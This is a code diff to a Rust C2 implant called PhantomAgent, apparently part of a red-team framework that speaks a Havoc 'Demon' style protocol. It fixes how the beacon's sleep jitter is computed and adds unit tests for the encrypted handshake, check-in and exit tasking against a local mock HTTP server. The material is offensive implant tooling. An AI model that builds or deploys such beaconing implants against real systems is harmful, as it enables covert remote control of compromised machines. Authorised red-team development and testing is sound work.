@@ -183,8 +183,9 @@ impl PhantomAgent {
         }
 
         let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
-        let jitter = rand::random::<u64>() % (jitter_range + 1);
-        base.saturating_sub(jitter / 2) + jitter / 2
+        let spread = jitter_range.saturating_mul(2);
+        let jitter = rand::random::<u64>() % (spread.saturating_add(1));
+        base.saturating_sub(jitter_range).saturating_add(jitter)
     }
 
     fn kill_date_elapsed(&self) -> bool {
@@ -252,20 +253,236 @@ fn is_elevated() -> bool {
 
 #[cfg(test)]
 mod tests {
+    use std::error::Error;
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+    use std::sync::mpsc;
+    use std::thread;
+
+    use red_cell_common::crypto::{
+        ctr_blocks_for_len, decrypt_agent_data_at_offset, encrypt_agent_data,
+        encrypt_agent_data_at_offset,
+    };
+    use red_cell_common::demon::{DemonCommand, DemonEnvelope, DemonMessage, DemonPackage};
+
     use super::PhantomAgent;
+    use super::callback_ctr_blocks;
     use crate::config::PhantomConfig;
 
     #[test]
-    fn agent_creation_succeeds() {
-        let agent = PhantomAgent::new(PhantomConfig::default()).expect("agent");
+    fn agent_creation_succeeds() -> Result<(), Box<dyn Error>> {
+        let agent = PhantomAgent::new(PhantomConfig::default())?;
         assert_ne!(agent.agent_id(), 0);
+        Ok(())
     }
 
     #[test]
-    fn collect_metadata_uses_linux_defaults() {
-        let agent = PhantomAgent::new(PhantomConfig::default()).expect("agent");
+    fn collect_metadata_uses_linux_defaults() -> Result<(), Box<dyn Error>> {
+        let agent = PhantomAgent::new(PhantomConfig::default())?;
         let metadata = agent.collect_metadata();
         assert_eq!(metadata.domain_name, "WORKGROUP");
         assert!(metadata.process_pid > 0);
+        Ok(())
+    }
+
+    #[test]
+    fn compute_sleep_delay_honors_jitter_range() -> Result<(), Box<dyn Error>> {
+        let config =
+            PhantomConfig { sleep_delay_ms: 1_000, sleep_jitter: 20, ..PhantomConfig::default() };
+        let agent = PhantomAgent::new(config)?;
+
+        for _ in 0..128 {
+            let delay = agent.compute_sleep_delay();
+            assert!((800..=1_200).contains(&delay));
+        }
+
+        Ok(())
+    }
+
+    #[test]
+    fn compute_sleep_delay_returns_base_without_jitter() -> Result<(), Box<dyn Error>> {
+        let config =
+            PhantomConfig { sleep_delay_ms: 1_337, sleep_jitter: 0, ..PhantomConfig::default() };
+        let agent = PhantomAgent::new(config)?;
+
+        assert_eq!(agent.compute_sleep_delay(), 1_337);
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn init_handshake_accepts_valid_acknowledgement()
+    -> Result<(), Box<dyn Error + Send + Sync>> {
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let address = listener.local_addr()?;
+        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
+        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();
+
+        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
+            let (mut stream, _) = listener.accept()?;
+            let request = read_http_request(&mut stream)?;
+            request_tx.send(request)?;
+
+            let body = response_rx.recv()?;
+            write_http_response(&mut stream, &body)?;
+            Ok(())
+        });
+
+        let config = PhantomConfig {
+            callback_url: format!("http://{address}/"),
+            sleep_delay_ms: 0,
+            ..PhantomConfig::default()
+        };
+        let mut agent = PhantomAgent::new(config)?;
+        let ack = encrypt_agent_data(
+            &agent.session_crypto.key,
+            &agent.session_crypto.iv,
+            &agent.agent_id.to_le_bytes(),
+        )?;
+        response_tx.send(ack)?;
+
+        agent.init_handshake().await?;
+
+        let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
+        assert!(!init_packet.is_empty());
+        assert_eq!(agent.recv_ctr_offset, 1);
+
+        let server_result = server.join().map_err(|_| "server thread panicked")?;
+        server_result?;
+
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn checkin_processes_exit_task() -> Result<(), Box<dyn Error + Send + Sync>> {
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let address = listener.local_addr()?;
+        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
+        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();
+
+        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
+            for _ in 0..3 {
+                let (mut stream, _) = listener.accept()?;
+                let request = read_http_request(&mut stream)?;
+                request_tx.send(request)?;
+                let body = response_rx.recv()?;
+                write_http_response(&mut stream, &body)?;
+            }
+            Ok(())
+        });
+
+        let config = PhantomConfig {
+            callback_url: format!("http://{address}/"),
+            sleep_delay_ms: 0,
+            ..PhantomConfig::default()
+        };
+        let mut agent = PhantomAgent::new(config)?;
+
+        response_tx.send(encrypt_agent_data(
+            &agent.session_crypto.key,
+            &agent.session_crypto.iv,
+            &agent.agent_id.to_le_bytes(),
+        )?)?;
+        agent.init_handshake().await?;
+
+        let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
+        assert!(!init_packet.is_empty());
+
+        let task = DemonPackage::new(DemonCommand::CommandExit, 7, 9_i32.to_le_bytes().to_vec());
+        let task_message = DemonMessage::new(vec![task]).to_bytes()?;
+        let encrypted_task = encrypt_agent_data_at_offset(
+            &agent.session_crypto.key,
+            &agent.session_crypto.iv,
+            agent.recv_ctr_offset,
+            &task_message,
+        )?;
+        let response = DemonEnvelope::new(agent.agent_id, encrypted_task)?.to_bytes();
+        let expected_recv_ctr_offset =
+            agent.recv_ctr_offset + ctr_blocks_for_len(response.len() - 12);
+        response_tx.send(response)?;
+        response_tx.send(Vec::new())?;
+
+        let exit_requested = agent.checkin().await?;
+        assert!(exit_requested);
+
+        let checkin_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
+        let envelope = DemonEnvelope::from_bytes(&checkin_packet)?;
+        let decrypted = decrypt_agent_data_at_offset(
+            &agent.session_crypto.key,
+            &agent.session_crypto.iv,
+            0,
+            &envelope.payload,
+        )?;
+        let message = DemonMessage::from_bytes(&decrypted)?;
+        assert_eq!(message.packages.len(), 1);
+        assert_eq!(message.packages[0].command()?, DemonCommand::CommandCheckin);
+        assert_eq!(agent.send_ctr_offset, callback_ctr_blocks(0) + callback_ctr_blocks(4));
+        assert_eq!(agent.recv_ctr_offset, expected_recv_ctr_offset);
+
+        let exit_callback_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
+        assert!(!exit_callback_packet.is_empty());
+
+        let server_result = server.join().map_err(|_| "server thread panicked")?;
+        server_result?;
+
+        Ok(())
+    }
+
+    fn read_http_request(
+        stream: &mut std::net::TcpStream,
+    ) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
+        let mut request = Vec::new();
+        let mut buffer = [0_u8; 4096];
+        let mut header_end = None;
+        let mut content_length = 0_usize;
+
+        loop {
+            let read = stream.read(&mut buffer)?;
+            if read == 0 {
+                break;
+            }
+            request.extend_from_slice(&buffer[..read]);
+
+            if header_end.is_none() {
+                header_end = request
+                    .windows(4)
+                    .position(|window| window == b"\r\n\r\n")
+                    .map(|index| index + 4);
+                if let Some(end) = header_end {
+                    let headers = std::str::from_utf8(&request[..end])?;
+                    content_length = headers
+                        .lines()
+                        .find_map(|line| {
+                            let (name, value) = line.split_once(':')?;
+                            name.eq_ignore_ascii_case("content-length").then_some(value.trim())
+                        })
+                        .unwrap_or("0")
+                        .parse::<usize>()?;
+                }
+            }
+
+            if let Some(end) = header_end
+                && request.len() >= end + content_length
+            {
+                break;
+            }
+        }
+
+        let body = header_end.map_or_else(Vec::new, |end| request[end..].to_vec());
+        Ok(body)
+    }
+
+    fn write_http_response(
+        stream: &mut std::net::TcpStream,
+        body: &[u8],
+    ) -> Result<(), Box<dyn Error + Send + Sync>> {
+        stream.write_all(
+            format!(
+                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                body.len()
+            )
+            .as_bytes(),
+        )?;
+        stream.write_all(body)?;
+        Ok(())
     }
 }
